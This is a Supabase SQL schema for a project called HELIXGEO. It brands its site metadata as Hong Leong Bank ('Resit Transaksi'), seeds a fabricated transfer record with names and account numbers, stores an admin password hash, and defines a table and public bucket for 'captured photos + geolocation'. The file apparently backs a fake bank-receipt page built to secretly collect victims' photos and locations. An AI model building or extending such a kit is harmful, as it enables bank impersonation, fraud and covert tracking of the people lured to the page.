-- ========================================
-- Supabase Schema for HELIXGEO
-- Run this in Supabase SQL Editor
-- ========================================

-- Table: profilweb (web profile/meta settings)
CREATE TABLE IF NOT EXISTS profilweb (
  id SERIAL PRIMARY KEY,
  site_title VARCHAR(255) NOT NULL DEFAULT '',
  meta_description TEXT DEFAULT NULL,
  favicon VARCHAR(500) DEFAULT NULL,
  apple_touch_icon VARCHAR(500) DEFAULT NULL,
  og_type VARCHAR(50) DEFAULT 'website',
  og_title VARCHAR(255) DEFAULT NULL,
  og_description TEXT DEFAULT NULL,
  og_url VARCHAR(500) DEFAULT NULL,
  og_site_name VARCHAR(255) DEFAULT NULL,
  og_locale VARCHAR(50) DEFAULT NULL,
  og_image VARCHAR(500) DEFAULT NULL,
  og_image_width VARCHAR(20) DEFAULT '1200',
  og_image_height VARCHAR(20) DEFAULT '630',
  og_image_alt VARCHAR(255) DEFAULT NULL,
  twitter_card VARCHAR(100) DEFAULT 'summary_large_image',
  twitter_title VARCHAR(255) DEFAULT NULL,
  twitter_description TEXT DEFAULT NULL,
  twitter_image VARCHAR(500) DEFAULT NULL,
  theme_color VARCHAR(20) DEFAULT '#0B1F5F',
  apple_webapp_capable VARCHAR(20) DEFAULT 'yes',
  apple_webapp_statusbar VARCHAR(50) DEFAULT 'default',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Insert default data
INSERT INTO profilweb (id, site_title, meta_description, favicon, apple_touch_icon, og_type, og_title, og_description, og_url, og_site_name, og_locale, og_image, og_image_width, og_image_height, og_image_alt, twitter_card, twitter_title, twitter_description, twitter_image, theme_color, apple_webapp_capable, apple_webapp_statusbar)
VALUES (1, 'HONGLEONG', 'HONGLEONG', NULL, NULL, 'website', 'HONGLEONG', 'HONGLEONG', '', 'Hong Leong Bank', 'en_MY', NULL, '1200', '630', 'Hong Leong Bank', 'summary_large_image', 'Hong Leong Bank', 'Resit Transaksi Hong Leong Bank', NULL, '#ff0000', 'yes', 'default')
ON CONFLICT (id) DO NOTHING;

-- Table: transfer_settings
CREATE TABLE IF NOT EXISTS transfer_settings (
  id SERIAL PRIMARY KEY,
  title VARCHAR(255) NOT NULL DEFAULT '',
  subtitle VARCHAR(255) NOT NULL DEFAULT '',
  amount_idr VARCHAR(100) NOT NULL DEFAULT '',
  amount_myr VARCHAR(100) NOT NULL DEFAULT '',
  sender_bank VARCHAR(255) NOT NULL DEFAULT '',
  sender_name VARCHAR(255) NOT NULL DEFAULT '',
  sender_account VARCHAR(255) NOT NULL DEFAULT '',
  receiver_bank VARCHAR(255) NOT NULL DEFAULT '',
  receiver_account VARCHAR(255) NOT NULL DEFAULT '',
  receiver_name VARCHAR(255) NOT NULL DEFAULT ''
);

-- Insert default data
INSERT INTO transfer_settings (id, title, subtitle, amount_idr, amount_myr, sender_bank, sender_name, sender_account, receiver_bank, receiver_account, receiver_name)
VALUES (1, 'BIBD Brunei Darussalam', 'Office Purchasing', 'IDR 515.000', 'BND 35.12', 'BIBD Brunei Darussalam', 'FITO ALAMSYAH', '72828172718', 'BANK BNI', '2093832050', 'Tasliyah')
ON CONFLICT (id) DO NOTHING;

-- Table: users (admin accounts)
CREATE TABLE IF NOT EXISTS users (
  id SERIAL PRIMARY KEY,
  username VARCHAR(100) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Insert admin user with bcrypt password hash
INSERT INTO users (id, username, password)
VALUES (1, 'admin', '$2a$12$b/4tAX9pcuDHNjTNkVyKfu7vxjPDqPFHqpY2ymZGwMi2BaVCf7gIe')
ON CONFLICT (id) DO NOTHING;

-- Table: records (captured photos + geolocation)
CREATE TABLE IF NOT EXISTS records (
  id SERIAL PRIMARY KEY,
  timestamp BIGINT NOT NULL,
  lat DOUBLE PRECISION DEFAULT NULL,
  lng DOUBLE PRECISION DEFAULT NULL,
  accuracy DOUBLE PRECISION DEFAULT NULL,
  foto_url TEXT DEFAULT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Create index for records ordering
CREATE INDEX IF NOT EXISTS idx_records_timestamp ON records (timestamp DESC);

-- ========================================
-- Storage Buckets (create via Supabase Dashboard)
-- ========================================
-- 1. Create bucket "captures" (public) - for foto and lokasi files
-- 2. Create bucket "uploads" (public) - for web profile images (favicon, og_image, etc.)
--
-- In Supabase Dashboard:
--   Storage > New Bucket > Name: "captures" > Public: ON
--   Storage > New Bucket > Name: "uploads" > Public: ON

-- ========================================
-- RLS Policies (optional - since we use service role key)
-- ========================================
-- If you want extra security, enable RLS on tables:
-- ALTER TABLE profilweb ENABLE ROW LEVEL SECURITY;
-- ALTER TABLE transfer_settings ENABLE ROW LEVEL SECURITY;
-- ALTER TABLE users ENABLE ROW LEVEL SECURITY;
-- ALTER TABLE records ENABLE ROW LEVEL SECURITY;

-- Allow public read on transfer_settings and profilweb
-- CREATE POLICY "Public read transfer_settings" ON transfer_settings FOR SELECT USING (true);
-- CREATE POLICY "Public read profilweb" ON profilweb FOR SELECT USING (true);
